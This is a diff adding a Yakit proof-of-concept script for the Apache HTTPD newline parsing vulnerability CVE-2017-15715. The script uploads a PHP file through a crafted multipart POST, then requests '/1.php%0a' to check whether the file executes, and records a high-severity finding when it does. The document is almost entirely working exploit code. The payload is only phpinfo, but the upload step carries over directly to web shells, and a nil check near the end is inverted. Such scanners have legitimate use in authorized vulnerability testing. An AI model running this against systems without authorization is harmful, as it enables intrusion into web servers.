@@ -1,0 +1,130 @@
+yakit.AutoInitYakit()
+log.setLevel("info")
+
+isHttps = cli.Have("https", cli.setDefault(false))
+target = cli.String("target")
+
+if str.IsHttpURL(target) == true {
+    yakit.Error("Please input without http:// or https://")
+    return
+}
+
+packet = `
+POST / HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------1805634617575765913805868277
+Content-Length: 359
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------1805634617575765913805868277
+Content-Disposition: form-data; name="file"; filename="1.php"
+Content-Type: application/octet-stream
+
+<?php phpinfo() ?>
+-----------------------------1805634617575765913805868277
+Content-Disposition: form-data; name="name"
+
+1.php
+
+-----------------------------1805634617575765913805868277--`
+
+debug = cli.Have("debug", cli.setDefault(false))
+
+if debug {
+    loglevel("debug")
+}
+
+sendPacket = func(target) {
+    return poc.HTTP(
+        packet, 
+        poc.timeout(10),
+        # poc.proxy("http://127.0.0.1:8083"),
+        # poc.proxy("http://127.0.0.1:7890"),
+        poc.redirectTimes(3),  # 重定向次数
+        poc.https(isHttps),
+        poc.params({
+            "target": target,
+        },
+    ))
+}
+
+checkpacket = `
+GET /1.php%0a HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+`
+checkPacket = func(target) {
+    return poc.HTTP(
+        checkpacket, 
+        poc.timeout(10),
+        # poc.proxy("http://127.0.0.1:8083"),
+        # poc.proxy("http://127.0.0.1:7890"),
+        poc.redirectTimes(3),  # 重定向次数
+        poc.https(isHttps),
+        poc.params({
+            "target": target,
+        },
+    ))
+}
+
+if YAK_MAIN {
+    rspBytes, reqBytes, err = sendPacket(target)
+    if err != nil {
+        yakit.Error(string(err))
+        return
+    }
+
+    if debug {
+        println(string(reqBytes))
+        println("---------------------------------")
+        println(string(rspBytes))
+    }
+
+    riskTarget = target
+
+    checkrsp, checkreq, checkerr = checkPacket(target)
+    if checkerr != nil {
+        yakit.Error(string(checkerr))
+        return
+    }
+    drsp, derr = str.ParseBytesToHTTPResponse(checkrsp)
+    if derr != nil {
+        yakit.Error(string(derr))
+        return
+    }
+
+    if drsp.StatusCode == 200 {
+        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(reqBytes, isHttps)
+        if urlIns == nil {
+            riskTarget = urlIns.String()
+        }
+        yakit.Info("Found Apache HTTPD 换行解析漏洞 CVE-2017-15715")
+        log.info("Found Apache HTTPD 换行解析漏洞 CVE-2017-15715")
+        # Save to RiskTable
+        risk.NewRisk(
+            riskTarget, risk.severity("high"), risk.type("poc"),
+            risk.title("Found Apache HTTPD Line parsing vulnerability CVE-2017-15715"),            ## English Title for Risk
+            risk.titleVerbose("Apache HTTPD 换行解析漏洞 CVE-2017-15715"),           ##  中文标题
+            risk.details({
+                "target": riskTarget,
+                "request": reqBytes,
+                "response": rspBytes,
+            }),
+        )
+    }else {
+        yakit.Info("Not Found CVE-2017-15715")
+        log.info("Not Found CVE-2017-15715")
+    }
+}
+
